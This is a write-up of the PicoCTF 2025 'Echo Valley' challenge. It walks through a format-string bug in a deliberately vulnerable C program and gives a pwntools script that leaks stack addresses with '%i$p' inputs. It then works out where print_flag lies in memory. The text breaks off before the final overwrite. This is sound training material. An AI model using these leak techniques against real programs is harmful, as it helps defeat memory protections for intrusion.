# Echo Valley
This was a challenge listed in PicoCTF 2025.  It's listed as Medium and categorized as a Binary Exploitation challenge.

## Description
The Description reads:
> The echo valley is a simple function that echoes back whatever you say to it.  
> But how do you make it respond with something more interesting, like a flag?

## Hints
There is a single hint that reads:
> Ever heard of a format string attack?

# Solving
## My Thoughts
This was the first of the challenges that I ended up solving after the CTF ended, I got a little sick of binary exploitation challenges during the actual event and instead banged my head against the CHACHA one for hours.  We'll see how it goes!

## Source Code
Before even jumping into the program, let's take a quick look at the source code, I've added comments to improve readability:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Prints the flag...duh.
void print_flag() {
    // Initiates a string variable named buf that will hold up to 32 bytes of data.
    char buf[32];

    // fopen will open a file pointer to the /home/valley/flag.txt file in read only mode.
    FILE *file = fopen("/home/valley/flag.txt", "r");

    // Makes sure the file actually exists
    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    // Uses the fgets function to read in data from the file (up to the size of buf), storing the data in buf.
    fgets(buf, sizeof(buf), file);
    // Prints the data in buf.
    printf("Congrats! Here is your flag: %s", buf);
    // Closes the file.
    fclose(file);
    // Exits out of the program.
    exit(EXIT_SUCCESS);
}

// This function is responsible for most of what actually happens and where our vulnerable code sits.
void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    // Initiates a string variable named buf that can hold up to 100 bytes.
    char buf[100];

    // Essentially will loop forever since 1 evaluates to True.
    while(1)
    {
        // Flushes the output buffer of the stdout stream, 
        // it makes sure any buffered data is written to the 
        // file/device associated with the stream.
        fflush(stdout);
        // Reads in up to 100 bytes of user input and stores it in buf.
        // Also checks to make sure the user actually entered something,
        // If they didn't, the program exits.
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        // Checks if the user entered the string 'exit' exactly.
        // If they did, it prints the below string and ends the while loop.
        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        // Prints out the user's input and flushes stdout like it did above.
        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    // Once the while loop is exited, the stdout stream is flushed.
    fflush(stdout);
}

// The main function, where everything else starts.
int main()
{
    // Calls the echo_valley function with no variables.
    echo_valley();
    // Returns 0 if the prgoram runs through without issues.
    return 0;
}

```

Now, there are really only a few functions in the script, let's look at each below:

- fflush:  This function is only really dangerous if it's used with an input stream.  It's only ever used with stdout in this program which means it's not dangerous or exploitable (at least not directly).
- fgets:  This function on it's own is not dangerous, but it combined with unsanitized input and the below function does make it problematic!
- printf:  This function allows us to send in format strings, allowing us to do all sorts of nasty things.
-
- Let's see what we can do with that, but first lets check out the executable.

## Executable
Let's run file on it to see what we're working with:

``` bash
└─$ file valley
valley: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=389c2641f0d3caae81af5d21d9bb5bcf2de217f0, for GNU/Linux 3.2.0, with debug_info, not stripped
```

So, we're working with a 64-bit LSB (least significant bit), PIE executable.  Running strings doesn't give us anything crazy, let's try running it now and see what we can do.

## Running It
Well we can definitely see that there is a string format vulnerability:

![String Format Vulnerability](https://github.com/user-attachments/assets/c60b3759-65ec-434d-8dee-479470975f9b)

Let's run it through GDB and get the memory addresses of the various functions:

``` bash
─
pwndbg> print main
$1 = {int ()} 0x555555555401 <main>
pwndbg> print print_flag
$2 = {void ()} 0x555555555269 <print_flag>
pwndbg> print echo_valley
$3 = {void ()} 0x555555555307 <echo_valley>
```

We can also see that the values above are based on the starting address below:

![Starting Address](https://github.com/user-attachments/assets/f25f776c-8430-4a51-975d-6799904a4622)

I wanted to set up a script I could easily reuse to parse through memory locations given a print string vulnerable application, so I wrote this one out.  You can find this [here](https://github.com/noah344/CTF_Stuff/blob/main/Scripts/Binary/grab_memory_addresses.py):

``` python
#! /usr/bin/python3
'''
This script should be ran after gathering memory address locations for the various functions in the binary (assuming you have the source code/have function names).
You can provide it both the start memory location and function memory locations.  You should adjust the various aspects to suit your own binary.
This script will only work if the binary is vulnerable to print format vulnerabilities.
'''

from pwn import *
import itertools

# Loops until the user enters a valid integer that corresponds with the number of memory addresses the script should parse through.
while(True):
  try:
    count = int(input("Please enter the number of memory addresses we should try: "))
    break
  except Exception as e:
    print("ERROR: Please enter a valid integer, your response ({count}) was not valid.")

# Loops until a break occurs
while(True):
  # Errors out if the user enters invalid hex (address location) data.
  try:
    print("\nEnter the expected start address of the program: ")
    start_addr = input("Address: ")
    # Attempts to conver the string to an integer and then to hex, if it fails the user did something wrong.
    hex(int(start_addr, 16))
    break
  except Exception as e:
    print(f"\nERROR: Invalid hex data entered ({start_addr}), please try again.")

print("\nIf you have expected addresses of other functions, enter them below.")
print("Please use this format: func_name:address.")
print("When done, or if you do not wish to enter additional addresses, simply press enter.")

# Initializes a dictionary to hold the user's entered info.
addrs = {}
# Initializes a string so the while loop will run.
res = " "
while(res):
  # Errors out if the user enters invalid hex data.
  try:
    res = input("Function Address (func_name:address): ")
    # Attempts to add the user's entered data into the dictionary with the func_name as the key and the address as the value.
    hex(int(res.split(":")[1], 16))
    addrs[res.split(":")[1]] = res.split(":")[0]
  except Exception as e:
    if res:
      print(f"\nERROR: Invalid hex data entered({res}), please try again.")

# Disables ASLR to mimic gdb
context.aslr = False
# Sets up the ELF so we can go through it.
elf = context.binary = ELF('./valley')
# Runs the process in the background
p = process()
# Gets the first line since we don't really care about it.
p.recvline()

# Initiates some lists for holding any matches we find.
matches = []
exact_matches = []

# Loops through the values 1-count, trying out those stack locations.
for i in range(1,count):
  # Sends the line that we'll be using to get the leak, .encode is necessary to quiet an annoying pwntools warning.
  p.sendline(f'%{i}$p'.encode())

  # Grabs the leak from the web server.
  elf_leak = p.recvline().decode().split(": ")[1].strip()

  # Checks if the leak is an exact match and adds it to exact_matches.
  if elf_leak in addrs.keys():
    exact_matches.append([elf_leak, i])
  # Checks if the leak is a close match and adds it to the close matches.
  elif start_addr[:-4] in elf_leak:
    matches.append([elf_leak, i])

# Only goes in here if there are any matches in exact_matches
if exact_matches:
  print("\nEXACT MATCHES")
  print("-------------")
  for i in exact_matches:
    print(f"Exact Match for Function {addrs[i[0]]} at offset {i[1]}: {i[0]}")

# Only goes in here if there are any matches in matches
if matches:
  print("\nCLOSE MATCHES")
  print("-------------")
  for i in matches:
    print(f"Close Match at offset {i[1]}: {i[0]}")

# If there are no matches at all
if not exact_matches and not matches:
  print("No matches found :(")
```

Essentially this script will parse through the binary to the specified offset and print out any memory locations that are exact or close matches to our known functions, check out the output below:

``` bash
└─$ ./grab_memory_addresses.py LOG_LEVEL=critical
Please enter the number of memory addresses we should try: 100

Enter the expected start address of the program:
Address: 0x555555554000

If you have expected addresses of other functions, enter them below.
Please use this format: func_name:address.
When done, or if you do not wish to enter additional addresses, simply press enter.
Function Address (func_name:address): main:0x555555555401
Function Address (func_name:address): echo_valley:0x555555555307
Function Address (func_name:address): print_flag:0x555555555269
Function Address (func_name:address):

EXACT MATCHES
-------------
Exact Match for Function main at offset 25: 0x555555555401
Exact Match for Function main at offset 44: 0x555555555401

CLOSE MATCHES
-------------
Close Match at offset 4: 0x5555555596b5
Close Match at offset 21: 0x555555555413
Close Match at offset 33: 0x555555557d78
Close Match at offset 45: 0x555555557d78
Close Match at offset 49: 0x555555555180
Close Match at offset 53: 0x5555555551a5
```

Awesome, so we have a couple memory offset locations for main! We can use that to exploit the binary locally and get our flag!  Let's get a few more numbers first:

- Distance between start of program and main:  0x555555555401 - 0x555555554000 = 0x1401
- Distance between start of program and print_flag: 0x555555555269 - 0x555555554000 = 0x1269

So, if we subtract 0x1401 from the found memory address of main, and then add 0x1269 to that number, we'll get the memory address of print_flag, let's test it out with the actual binary:

``` bash
└─$ ./valley
Welcome to the Echo Valley, Try Shouting:
%25$p
You heard in the distance: 0x562e16fb9401
```

Ok, so the memory location of main is:  0x562e16fb9401  
So the start location will be:  0x562e16fb9401 - 0x1401 = 0x562e16fb8000  
And the memory location of print_flag will be:  0x562e16fb8000 + 0x1269 = 0x562E16FB9269

